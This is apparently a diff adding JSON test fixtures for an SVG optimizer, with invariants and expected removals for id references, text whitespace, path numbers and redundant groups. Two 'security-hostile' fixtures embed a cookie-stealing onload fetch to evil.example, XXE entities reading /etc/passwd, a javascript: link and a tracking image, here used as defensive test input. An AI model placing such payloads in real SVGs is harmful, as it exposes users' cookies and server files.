<rect x=\"0\" y=\"0\" width=\"240\" height=\"160\" fill=\"url(#p1)\"/>\n  <rect x=\"20\" y=\"40\" width=\"120\" height=\"60\" rx=\"8\" fill=\"url(#g1)\" filter=\"url(#f1)\"/>\n  <use xlink:href=\"#shape1\" x=\"180\" y=\"70\"/>\n  <line x1=\"146\" y1=\"70\" x2=\"164\" y2=\"70\" stroke=\"#5c7a12\" stroke-width=\"3\" marker-end=\"url(#arrow)\"/>\n</svg>",
+    "invariants": [
+      "id=\"g1\" must survive: referenced directly by the rounded rect fill=\"url(#g1)\"",
+      "id=\"g2\" must survive: referenced transitively via fill=\"url(#g2)\" on <circle id=\"shape1\">, which is itself instantiated by <use>",
+      "id=\"f1\" must survive: referenced by filter=\"url(#f1)\" on the rounded rect",
+      "id=\"p1\" must survive: referenced by the full-canvas background rect fill=\"url(#p1)\"",
+      "id=\"arrow\" must survive: referenced by marker-end=\"url(#arrow)\" on the <line>",
+      "id=\"shape1\" must survive: referenced by <use xlink:href=\"#shape1\">",
+      "The xlink:href reference form must be recognized as a reference (not only the plain href form); dropping shape1 because only href was scanned would be a bug",
+      "The optimizer must follow transitive references: g2 is only reachable through shape1, which is only reachable through <use>, so pruning must not treat g2 as orphaned",
+      "Rendered output must be visually identical after optimization (same fills, filter, pattern tiling, marker, and use instance)"
+    ],
+    "expectedRemovals": [
+      "The <rect id=\"unused1\"> element in <defs> (id \"unused1\" is never referenced by any url(#...), href, or xlink:href) can be removed entirely"
+    ],
+    "realistic": true
+  },
+  {
+    "name": "badge-plain-href-refs",
+    "category": "reference-aware-id-handling",
+    "source": "Hand-authored SVG mimicking a hand-coded logo/badge with a plain href <use>",
+    "svg": "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" viewBox=\"0 0 200 200\" width=\"200\" height=\"200\">\n  <defs>\n    <linearGradient id=\"g1\" x1=\"0\" y1=\"0\" x2=\"0\" y2=\"1\">\n      <stop offset=\"0\" stop-color=\"#2b8a3e\"/>\n      <stop offset=\"1\" stop-color=\"#154a20\"/>\n    </linearGradient>\n    <radialGradient id=\"ring\" cx=\"0.5\" cy=\"0.5\" r=\"0.5\">\n      <stop offset=\"0.7\" stop-color=\"#8ce99a\" stop-opacity=\"0\"/>\n      <stop offset=\"1\" stop-color=\"#2b8a3e\"/>\n    </radialGradient>\n    <filter id=\"f1\">\n      <feDropShadow dx=\"0\" dy=\"2\" stdDeviation=\"3\" flood-color=\"#000000\" flood-opacity=\"0.3\"/>\n    </filter>\n    <pattern id=\"p1\" width=\"10\" height=\"10\" patternUnits=\"userSpaceOnUse\" patternTransform=\"rotate(45)\">\n      <line x1=\"0\" y1=\"0\" x2=\"0\" y2=\"10\" stroke=\"#154a20\" stroke-width=\"2\"/>\n    </pattern>\n    <marker id=\"arrow\" markerWidth=\"10\" markerHeight=\"10\" refX=\"7\" refY=\"3\" orient=\"auto\" markerUnits=\"strokeWidth\">\n      <path d=\"M0,0 L7,3 L0,6 Z\" fill=\"#154a20\"/>\n    </marker>\n    <path id=\"shape1\" d=\"M0,-10 L3,-3 L10,0 L3,3 L0,10 L-3,3 L-10,0 L-3,-3 Z\" fill=\"url(#ring)\"/>\n    <text id=\"unused-label\" x=\"0\" y=\"0\" font-size=\"12\">draft</text>\n  </defs>\n  <circle cx=\"100\" cy=\"100\" r=\"80\" fill=\"url(#g1)\" filter=\"url(#f1)\"/>\n  <circle cx=\"100\" cy=\"100\" r=\"80\" fill=\"url(#p1)\" opacity=\"0.15\"/>\n  <use href=\"#shape1\" transform=\"translate(100 100) scale(2.2)\"/>\n  <path d=\"M40,150 Q100,180 160,150\" fill=\"none\" stroke=\"#8ce99a\" stroke-width=\"4\" marker-end=\"url(#arrow)\"/>\n</svg>",
+    "invariants": [
+      "id=\"g1\" must survive: referenced by the base <circle> fill=\"url(#g1)\"",
+      "id=\"ring\" must survive: referenced transitively via fill=\"url(#ring)\" on <path id=\"shape1\">, which is instantiated by <use>",
+      "id=\"f1\" must survive: referenced by filter=\"url(#f1)\" on the base <circle>",
+      "id=\"p1\" must survive: referenced by the overlay <circle> fill=\"url(#p1)\"",
+      "id=\"arrow\" must survive: referenced by marker-end=\"url(#arrow)\" on the bottom <path>",
+      "id=\"shape1\" must survive: referenced by <use href=\"#shape1\"> (plain href, no xlink namespace)",
+      "The plain href reference form must be recognized (this fixture deliberately uses href, not xlink:href); pruning shape1 here would be a bug",
+      "The optimizer must follow transitive references: ring is only reachable through shape1, which is only reachable through <use>",
+      "The text content \"draft\" inside the removable element is the only text node; any text-preservation logic must not keep the node alive on that basis since the id is unreferenced",
+      "Rendered output must be visually identical after optimization"
+    ],
+    "expectedRemovals": [
+      "The <text id=\"unused-label\">draft</text> element in <defs> (id \"unused-label\" is never referenced anywhere) can be removed entirely"
+    ],
+    "realistic": true
+  },
+  {
+    "name": "text-xmlspace-monospace-status",
+    "category": "text-whitespace-preservation",
+    "source": "Hand-authored terminal-style status widget (monospace SVG dashboard label)",
+    "svg": "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"480\" height=\"120\" viewBox=\"0 0 480 120\">\n  <!-- terminal status widget -->\n  <rect x=\"0\" y=\"0\" width=\"480\" height=\"120\" fill=\"#0d1b2a\" stroke=\"none\"/>\n  <text x=\"24\" y=\"48\" xml:space=\"preserve\" font-family=\"'Courier New', monospace\" font-size=\"18\" fill=\"#e0e1dd\" fill-opacity=\"1\">STATUS:   ONLINE   </text>\n  <text x=\"24\" y=\"84\" xml:space=\"preserve\" font-family=\"'Courier New', monospace\" font-size=\"18\" fill=\"#8ecae6\"> load  avg    0.42</text>\n</svg>",
+    "invariants": [
+      "font-family=\"'Courier New', monospace\" MUST be preserved on both text elements, and the multi-word family name 'Courier New' MUST remain quoted (single or double quotes are equally valid); dropping the quotes entirely would break parsing of the family name."
+    ],
+    "expectedRemovals": [
+      "The XML comment <!-- terminal status widget -->",
+      "stroke=\"none\" on the <rect> (the default stroke value)",
+      "fill-opacity=\"1\" on the first <text> (the default opacity)",
+      "x=\"0\" and y=\"0\" on the <rect> (default coordinates)",
+      "Indentation and newline whitespace BETWEEN elements (this whitespace is outside any <text> content and is not rendered)"
+    ],
+    "realistic": true
+  },
+  {
+    "name": "text-tspan-dxdy-wordmark",
+    "category": "text-whitespace-preservation",
+    "source": "Hand-authored serif wordmark with a trademark superscript and tagline built from dx/dy-offset tspans",
+    "svg": "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"360\" height=\"140\" viewBox=\"0 0 360 140\">\n  <!-- wordmark with trademark and tagline -->\n  <text x=\"40\" y=\"70\" font-family=\"Georgia, 'Times New Roman', serif\" font-size=\"32\" font-weight=\"normal\" fill=\"#2b2d42\" xml:space=\"preserve\">Hello   World<tspan dx=\"6\" dy=\"-14\" font-size=\"16\" fill=\"#ef233c\">TM</tspan><tspan dx=\"4\" dy=\"14\" font-size=\"16\"> now  shipping </tspan></text>\n</svg>",
+    "invariants": [
+      "The <text> element MUST retain xml:space=\"preserve\"; without it the internal whitespace collapses and the words re-space.",
+      "The root text node content MUST be byte-preserved exactly as \"Hello   World\" (three spaces between the two words).",
+      "The second <tspan> content MUST be byte-preserved exactly as \" now  shipping \" (one leading space, two spaces after \"now\", one trailing space); leading and trailing spaces are significant under xml:space=\"preserve\".",
+      "Both <tspan> elements MUST be preserved as separate elements; the dx/dy offsets position their glyphs and cannot be flattened into the parent text.",
+      "The dx/dy attributes MUST be preserved exactly: first tspan dx=\"6\" dy=\"-14\", second tspan dx=\"4\" dy=\"14\" (including the negative sign on the first dy).",
+      "font-family=\"Georgia, 'Times New Roman', serif\" MUST be preserved verbatim, including the inner single quotes around the multi-word family name and the ordering of the fallback list.",
+      "The per-tspan font-size=\"16\" values MUST be preserved (they differ from the parent font-size=\"32\" and set the smaller superscript/tagline size).",
+      "The rendered result MUST be visually identical after optimization."
+    ],
+    "expectedRemovals": [
+      "The XML comment <!-- wordmark with trademark and tagline -->",
+      "font-weight=\"normal\" on the <text> (the default weight)",
+      "Indentation and newline whitespace BETWEEN the top-level elements (outside the <text> content, therefore not rendered)"
+    ],
+    "realistic": true
+  },
+  {
+    "name": "script-and-event-handlers-bell",
+    "category": "security-hostile",
+    "source": "Hand-crafted hostile fixture (notification-bell icon carrying an injected <script> plus on* event-handler attributes on shapes)",
+    "svg": "<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 120 120\" width=\"120\" height=\"120\">\n  <title>Notification Bell</title>\n  <script type=\"text/javascript\">alert(1)</script>\n  <circle cx=\"60\" cy=\"60\" r=\"56\" fill=\"#abcf37\" onload=\"fetch('https://evil.example/beacon?c='+document.cookie)\"/>\n  <path d=\"M60 30a18 18 0 0 0-18 18v14l-6 8v4h48v-4l-6-8V48a18 18 0 0 0-18-18z\" fill=\"#1b1b1b\" onclick=\"alert(1)\"/>\n  <circle cx=\"60\" cy=\"92\" r=\"6\" fill=\"#1b1b1b\"/>\n</svg>\n",
+    "invariants": [
+      "The <path> bell body must survive with its d attribute byte-for-byte unchanged, including both elliptical-arc segments written as 'a18 18 0 0 0' (no space after the 'a' command letter) — the arc flag digits '0 0 0' must not be reformatted or merged with the following coordinate (e.g. must not become 'a18 18 0 000-18 18')."
+    ],
+    "expectedRemovals": [
+      "The entire <script type=\"text/javascript\"> element and its alert(1) payload — DANGER: arbitrary JS execution.",
+      "The onload=\"fetch('https://evil.example/beacon?c='+document.cookie)\" attribute on the background <circle> — DANGER: cookie exfiltration to an external host; removal must not leave any external network reference behind.",
+      "The onclick=\"alert(1)\" attribute on the <path> — DANGER: event-handler script execution.",
+      "The optional <title> may be dropped as non-rendering metadata (acceptable but not required)."
+    ],
+    "realistic": true
+  },
+  {
+    "name": "doctype-entities-external-image-js-href",
+    "category": "security-hostile",
+    "source": "Hand-crafted hostile fixture (reward-banner SVG with a DOCTYPE external-entity block, a javascript: anchor, and an external tracking <image>)",
+    "svg": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE svg [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n  <!ENTITY tracker SYSTEM \"https://evil.example/steal\">\n]>\n<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" viewBox=\"0 0 220 90\" width=\"220\" height=\"90\">\n  <title>Rewards Banner</title>\n  <rect width=\"220\" height=\"90\" rx=\"10\" fill=\"#0d1b2a\"/>\n  <a xlink:href=\"javascript:alert(1)\">\n    <rect x=\"14\" y=\"25\" width=\"110\" height=\"40\" rx=\"6\" fill=\"#abcf37\"/>\n    <text x=\"69\" y=\"51\" font-family=\"sans-serif\" font-size=\"15\" fill=\"#0d1b2a\" text-anchor=\"middle\">Claim</text>\n  </a>\n  <image x=\"150\" y=\"15\" width=\"56\" height=\"60\" href=\"https://evil.example/track.png\"/>\n</svg>\n",
+    "invariants": [
+      "The background <rect width=220 height=90 rx=10 fill=#0d1b2a> must survive.",
+      "The button <rect x=14 y=25 width=110 height=40 rx=6 fill=#abcf37> must survive; its rx=6 rounded corners must be preserved.",
+      "The <text> node must survive with its exact content 'Claim' (no leading/trailing whitespace change), text-anchor=\"middle\", font-size=\"15\", and fill=\"#0d1b2a\".",
+      "Fill colors #0d1b2a and #abcf37 must be preserved (visual result identical).",
+      "Root viewBox=\"0 0 220 90\", width=\"220\", height=\"90\" must be preserved.",
+      "The optimizer MUST NOT resolve or expand the SYSTEM entities: no read of file:///etc/passwd and no fetch of https://evil.example/steal may occur during optimization (no XXE, no exfiltration).",
+      "The optimizer MUST NOT initiate or preserve any external fetch for the tracking image; the resulting SVG must reference no external host.",
+      "After optimization the two rects and the 'Claim' text must render identically to the input; the <a> wrapper may be unwrapped but its child shapes must remain."
+    ],
+    "expectedRemovals": [
+      "The entire DOCTYPE internal subset including <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> and <!ENTITY tracker SYSTEM \"https://evil.example/steal\"> — DANGER: external/general entity declarations are an XXE / entity-expansion vector.",
+      "The javascript:alert(1) value on the <a xlink:href> — DANGER: script-URL execution on click; the anchor should be neutralized (href stripped) or unwrapped, leaving its child rect and text intact.",
+      "The <image href=\"https://evil.example/track.png\"> element — DANGER: external resource load / tracking beacon; remove the element or at minimum strip the external href so nothing is fetched.",
+      "The optional <?xml ...?> prolog and <title> may be dropped as non-rendering (acceptable but not required)."
+    ],
+    "realistic": true
+  },
+  {
+    "name": "arc-flags-packed-badge",
+    "category": "path-data-arc-flags-and-numbers",
+    "source": "Hand-authored SVG icon in the style of Illustrator/SVGO compact path output (rounded-square app badge with a white disc)",
+    "svg": "<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 24 24\" width=\"24\" height=\"24\">\n  <rect width=\"24\" height=\"24\" fill=\"rgb(76,175,80)\"/>\n  <path fill=\"#FFFFFF\" fill-opacity=\".5\"\n    d=\"M6 2h12a4 4 0 014 4v12a4 4 0 01-4 4H6a4 4 0 01-4-4V6a4 4 0 014-4z\"/>\n  <path fill=\"white\" stroke=\"rgb(255,255,255)\" stroke-width=\"1.0\"\n    d=\"M12 7a5 5 0 015 5 5 5 0 01-5 5 5 5 0 01-5-5 5 5 0 015-5z\"/>\n</svg>\n",
+    "invariants": [
+      "Overall rendered shapes are visually identical before/after optimization: a 20x20 rounded square (corner radius 4, white fill at 50% opacity, no stroke) inset in a 24x24 rgb(76,175,80)/#4caf50 tile, plus a white disc centered at (12,12) whose PATH radius is 5 and whose RENDERED radius is ~5.5 because of the 1px white stroke (fill and stroke both white, both preserved)."
+    ],
+    "expectedRemovals": [
+      "rgb(76,175,80) shortened to hex #4caf50",
+      "#FFFFFF shortened to #fff",
+      "named color white shortened to #fff",
+      "rgb(255,255,255) shortened to #fff",
+      "trailing zero in stroke-width \"1.0\" collapsed to \"1\"",
+      "insignificant whitespace / newlines / indentation between attributes and elements collapsed"
+    ],
+    "realistic": true
+  },
+  {
+    "name": "scientific-and-packed-number-path",
+    "category": "path-data-arc-flags-and-numbers",
+    "source": "Hand-authored SVG 'verified' badge in compact path notation, mimicking high-precision tool export (scientific notation, trailing zeros, packed negatives)",
+    "svg": "<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 20 20\" width=\"20\" height=\"20\">\n  <path fill=\"rgb(30,144,255)\" fill-opacity=\".25\" stroke=\"#1E90FF\" stroke-width=\"2.0\"\n    d=\"M1e1 1a9 9 1e-3 019 9 9 9 0 01-9 9 9 9 0 01-9-9 9 9 0 019-9z\"/>\n  <path fill=\"none\" stroke=\"white\" stroke-width=\"2\" stroke-opacity=\".5\"\n    d=\"M5.5 1.05e1L9.00 14l6.5-8.5\"/>\n</svg>\n",
+    "invariants": [
+      "Scientific-notation coordinates must parse to their real values: 'M1e1 1' starts at (10,1) and the checkmark's '1.05e1' equals 10.5 (not 1.05 and not 105).",
+      "First disc arc has a scientific x-axis-rotation '1e-3' (~0.001) immediately followed by the packed flags '019'. The rotation may be rounded to 0, but the two flags after it must still parse as large-arc-flag=0, sweep-flag=1 and the x coordinate as 9 — the rotation's exponent must not swallow the flags or the coordinate.",
+      "All 4 disc arcs have large-arc-flag=0 and sweep-flag=1; the packed forms '019' and '01-9' must not merge flag digits into the coordinate (x stays 9 or -9, never 19 or 0.19).",
+      "Disc geometry is a radius-9 circle centered at (10,10) (arc endpoints (19,10)->(10,19)->(1,10)->(10,1)); packed negatives '-9-9' must parse as x=-9,y=-9.",
+      "Checkmark polyline points stay (5.5,10.5) -> (9,14) -> (15.5,5.5): 'L9.00 14' must read 9 (trailing zeros stripped) and the relative 'l6.5-8.5' must parse as +6.5 then -8.5 (packed negative not merged with the previous number).",
+      "rgb(30,144,255) and #1E90FF must both resolve to the identical color #1e90ff; the named color white on the checkmark must resolve to #ffffff.",
+      "Opacity values are preserved exactly: fill-opacity=0.25 and stroke-opacity=0.5 (the leading-zero forms may be normalized but the numeric value must not change)."
+    ],
+    "expectedRemovals": [
+      "scientific/verbose numbers normalized to shortest plain form: 1e1 -> 10, 1.05e1 -> 10.5, 9.00 -> 9, trailing-zero stroke-width 2.0 -> 2",
+      "tiny arc rotation 1e-3 rounded to 0 (permitted only if the following flags and coordinate stay intact)",
+      "rgb(30,144,255) shortened to #1e90ff and #1E90FF lowercased to #1e90ff",
+      "named color white shortened to #fff",
+      "insignificant whitespace / newlines / indentation collapsed"
+    ],
+    "realistic": true
+  },
+  {
+    "name": "illustrator-nested-group-icon",
+    "category": "structural-bloat",
+    "source": "Adobe Illustrator 27.5 (Win64) SVG export",
+    "svg": "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"48\" height=\"48\" viewBox=\"0 0 48 48\">\n  <!-- Generator: Adobe Illustrator 27.5.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->\n  <defs/>\n  <metadata>\n    <sfw xmlns=\"http://ns.adobe.com/SaveForWeb/1.0/\"><slices/></sfw>\n  </metadata>\n  <g id=\"Layer_1\">\n    <g>\n      <g>\n        <!-- clipboard body -->\n        <path fill=\"#2B3A55\" d=\"M14 8h20a2 2 0 0 1 2 2v30a2 2 0 0 1-2 2H14a2 2 0 0 1-2-2V10a2 2 0 0 1 2-2z\"/>\n      </g>\n    </g>\n    <g>\n      <!-- clip tab -->\n      <rect x=\"19\" y=\"5\" width=\"10\" height=\"6\" rx=\"1.5\" fill=\"#CE5A67\"/>\n    </g>\n    <g></g>\n    <g>\n      <g>\n        <path fill=\"#F4F0E6\" d=\"M17 18h14v2H17zM17 24h14v2H17zM17 30h9v2h-9z\"/>\n      </g>\n    </g>\n  </g>\n</svg>",
+    "invariants": [
+      "SVG is well-formed (xmllint --noout passes) with 7 <g>, 2 <path>, 1 <rect>.",
+      "No element references #Layer_1 (0 occurrences of url(#...), href=\"#...\", or xlink:href=\"#...\" in the document), so unwrapping the id=\"Layer_1\" group and dropping its id is safe and changes no rendering.",
+      "The ONLY attribute on any <g> is id=\"Layer_1\"; all other six <g> wrappers are attribute-free, so collapsing/unwrapping every group is a pure structural change with zero visual effect.",
+      "Source paint order body(#2B3A55) -> rect(#CE5A67) -> text(#F4F0E6) is preserved after group collapse and empty-<g> removal, keeping the tab and text lines rendered on top of the body.",
+      "All three geometry primitives lie within the 0..48 bounds: body rounded-rect (12,8)-(36,42); tab rect (19,5)-(29,11); text path three rects at y=18/24/30 spanning x=17..31 (and 17..26 for the third)."
+    ],
+    "expectedRemovals": [
+      "<defs/> (empty)",
+      "<metadata> block including the sfw/slices Adobe SaveForWeb payload",
+      "all XML comments (Generator comment and the inline descriptive comments)",
+      "the empty <g></g> element",
+      "redundant single-child no-attribute <g> wrappers (the nested groups around the body path and the text-line path collapse to their child)",
+      "id=\"Layer_1\" wrapper group may be unwrapped since it carries only an id with no styling"
+    ],
+    "realistic": true
+  },
+  {
+    "name": "figma-logo-empty-groups-with-opacity-trap",
+    "category": "structural-bloat",
+    "source": "Figma SVG export (hand-tidied)",
+    "svg": "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"120\" height=\"40\" viewBox=\"0 0 120 40\" fill=\"none\">\n  <metadata/>\n  <defs></defs>\n  <!-- mark -->\n  <g id=\"logo\">\n    <g>\n      <g id=\"glyph\">\n        <path d=\"M8 30 L20 6 L32 30 Z\" fill=\"#abcf37\"/>\n      </g>\n    </g>\n    <!-- decorative shadow layer: NOT empty, carries transform + opacity -->\n    <g transform=\"translate(2 3)\" opacity=\"0.25\">\n      <path d=\"M8 30 L20 6 L32 30 Z\" fill=\"#1a1a1a\"/>\n    </g>\n    <g></g>\n    <g>\n      <!-- wordmark -->\n      <path d=\"M48 12h4v16h-4zM56 12h10v3.5h-6v3h5v3.5h-5V28h-4zM70 12h4l4 8 4-8h4v16h-4v-9l-4 7-4-7v9h-4z\" fill=\"#2b2b2b\"/>\n    </g>\n    <g opacity=\"1\">\n      <circle cx=\"110\" cy=\"12\" r=\"3\" fill=\"#CE5A67\"/>\n    </g>\n  </g>\n</svg>",
+    "invariants": [
+      "The #abcf37 triangle path d=\"M8 30 L20 6 L32 30 Z\" fill=\"#abcf37\" must survive unchanged.",
+      "The #1a1a1a shadow path d=\"M8 30 L20 6 L32 30 Z\" fill=\"#1a1a1a\" must survive with an effective transform of translate(2 3) AND effective opacity 0.25 applied to it — whether that is carried by its wrapping <g transform=\"translate(2 3)\" opacity=\"0.25\"> or hoisted onto the path itself (both are pixel-identical because the group has a single, single-fill child). The transform and non-default opacity MUST NOT be discarded; simply unwrapping the group without preserving them would shift and lighten the shadow.",
+      "The #2b2b2b wordmark path d must survive byte-identical (d=\"M48 12h4v16h-4zM56 12h10v3.5h-6v3h5v3.5h-5V28h-4zM70 12h4l4 8 4-8h4v16h-4v-9l-4 7-4-7v9h-4z\").",
+      "The #CE5A67 circle cx=110 cy=12 r=3 must survive with no enclosing opacity change (the <g opacity=\"1\"> wrapper may be dropped since opacity=1 is a no-op).",
+      "Root attributes viewBox=\"0 0 120 40\", width=120, height=40 must be preserved; fill=\"none\" on the root should be preserved (it is inert here but preserving root attributes is the safe/conservative expectation).",
+      "Final rendered pixels must be identical to the input at the export size."
+    ],
+    "expectedRemovals": [
+      "<metadata/> (empty)",
+      "<defs></defs> (empty)",
+      "all XML comments",
+      "the empty <g></g> element",
+      "redundant single-child no-attribute wrapper groups around the glyph path (the <g>/<g id=\"glyph\"> nesting collapses; id may be dropped if unreferenced)",
+      "the no-attribute <g> wrapper around the wordmark path collapses to the path",
+      "the <g opacity=\"1\"> around the circle collapses: opacity=\"1\" is the default and has no visual effect, so the group is redundant"
+    ],
+    "realistic": true
+  }
+]
